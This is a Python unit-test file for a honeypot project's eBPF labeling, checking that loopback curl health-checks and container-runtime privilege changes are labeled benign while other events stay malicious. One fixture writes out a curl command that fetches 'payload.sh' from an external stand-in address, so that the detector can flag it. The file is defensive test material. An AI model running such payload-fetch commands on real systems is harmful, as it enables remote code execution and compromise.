"""Weak-label correctness for eBPF host/container baseline.

These guard against the false positives seen in the first live capture on the
T-Pot honeypot (2026-06-23): loopback `curl` from container health-checks and
`runc`/containerd privilege changes were both labeled "malicious".
"""
from __future__ import annotations

import unittest

from honeypot_ai.endpoint import build_endpoint_windows
from honeypot_ai.parsers import parse_record


def _ebpf_window(records):
    events = [parse_record(rec, source_hint="ebpf") for rec in records]
    windows = build_endpoint_windows(events, protected_cidrs=["10.0.5.0/24"])
    assert len(windows) == 1, f"expected exactly 1 window, got {len(windows)}"
    return windows[0]


def _exec(comm, binary, args, ts="2026-06-23T18:56:01+00:00", host="test-host"):
    return {
        "schema_version": 1,
        "timestamp": ts,
        "host": host,
        "event_type": "process_exec",
        "comm": comm,
        "binary": binary,
        "arguments_sample": args,
    }


def _priv(comm, binary, ts="2026-06-23T18:56:01+00:00", host="test-host"):
    return {
        "schema_version": 1,
        "timestamp": ts,
        "host": host,
        "event_type": "privilege_change",
        "comm": comm,
        "binary": binary,
    }


class LoopbackDownloadLabelTests(unittest.TestCase):
    def test_loopback_curl_is_not_counted_as_download(self) -> None:
        window = _ebpf_window(
            [_exec("curl", "/usr/bin/curl", ["curl", "-s", "-m2", "http://127.0.0.1"])]
        )
        self.assertEqual(window.features["download_tool_execs"], 0.0)
        self.assertEqual(window.features["download_commands"], 0.0)
        self.assertEqual(window.label, "benign")

    def test_external_curl_is_still_counted_as_download(self) -> None:
        window = _ebpf_window(
            [_exec("curl", "/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/payload.sh"])]
        )
        self.assertGreaterEqual(window.features["download_tool_execs"], 1.0)
        self.assertEqual(window.label, "malicious")
        self.assertIn("eBPF download tool execution", window.label_reasons)


class ContainerRuntimePrivilegeLabelTests(unittest.TestCase):
    def test_container_runtime_privilege_change_is_allowlisted(self) -> None:
        window = _ebpf_window([_priv("runc:[2:INIT]", "/usr/bin/runc")])
        self.assertEqual(window.features["privilege_changes"], 0.0)
        self.assertEqual(window.label, "benign")

    def test_containerd_shim_privilege_change_is_allowlisted(self) -> None:
        window = _ebpf_window(
            [_priv("containerd-shim", "/usr/bin/containerd-shim-runc-v2")]
        )
        self.assertEqual(window.features["privilege_changes"], 0.0)
        self.assertEqual(window.label, "benign")

    def test_non_runtime_privilege_change_still_counts(self) -> None:
        window = _ebpf_window([_priv("sh", "/bin/sh")])
        self.assertEqual(window.features["privilege_changes"], 1.0)
        self.assertEqual(window.label, "malicious")
        self.assertIn("eBPF privilege change", window.label_reasons)


if __name__ == "__main__":
    unittest.main()
